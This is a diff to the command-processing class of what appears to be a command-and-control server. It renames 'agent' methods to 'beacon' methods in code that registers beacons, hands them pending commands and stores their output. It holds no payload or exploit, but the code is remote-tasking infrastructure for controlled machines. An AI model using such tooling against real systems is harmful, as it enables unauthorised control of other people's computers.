@@ -10,7 +10,7 @@ class CommandProcessor:
 
     def process_registration(self, beacon_id: str, computer_name: str, receiver_id: str = None, receiver_name: str = None) -> str:
         import utils  # Import here to avoid circular imports
-        self.beacon_repository.update_agent_status(beacon_id, 'online', computer_name, receiver_id)
+        self.beacon_repository.update_beacon_status(beacon_id, 'online', computer_name, receiver_id)
         if utils.logger:
             display_name = receiver_name or receiver_id or "Unknown"
             utils.logger.log_message(f"Beacon Registration: {beacon_id} ({computer_name}) via receiver {display_name}")
@@ -18,8 +18,8 @@ class CommandProcessor:
 
     def process_action_request(self, beacon_id: str, receiver_id: str = None, receiver_name: str = None) -> str:
         import utils  # Import here to avoid circular imports
-        beacon = self.beacon_repository.get_agent(beacon_id)
-        self.beacon_repository.update_agent_status(beacon_id, "online", receiver_id=receiver_id)
+        beacon = self.beacon_repository.get_beacon(beacon_id)
+        self.beacon_repository.update_beacon_status(beacon_id, "online", receiver_id=receiver_id)
         if not beacon.pending_command:
             if utils.logger:
                 utils.logger.log_message(f"Check In: {beacon_id} - No pending commands")
@@ -29,7 +29,7 @@ class CommandProcessor:
             return ""
 
         command = beacon.pending_command
-        self.beacon_repository.update_agent_command(beacon_id, None)
+        self.beacon_repository.update_beacon_command(beacon_id, None)
 
         return self._format_command_response(command)
 
@@ -47,12 +47,12 @@ class CommandProcessor:
                 f.write(f"[{timestamp}] {output}")
             
             # Clear the pending command since received output
-            self.beacon_repository.update_agent_command(beacon_id, None)
+            self.beacon_repository.update_beacon_command(beacon_id, None)
             
             # Update the agent's output file path if needed
-            beacon = self.beacon_repository.get_agent(beacon_id)
+            beacon = self.beacon_repository.get_beacon(beacon_id)
             if beacon and not beacon.output_file:
-                self.beacon_repository.update_agent_response(
+                self.beacon_repository.update_beacon_response(
                     beacon_id,
                     str(output_file)
                 )
@@ -96,7 +96,7 @@ class CommandProcessor:
             return f"Error: {e}"
 
     def process_download_status(self, beacon_id: str, filename: str, status: str) -> str:
-        self.beacon_repository.update_agent_response(beacon_id, f"{status}|{filename}")
+        self.beacon_repository.update_beacon_response(beacon_id, f"{status}|{filename}")
         return "Status updated"
 
     @staticmethod
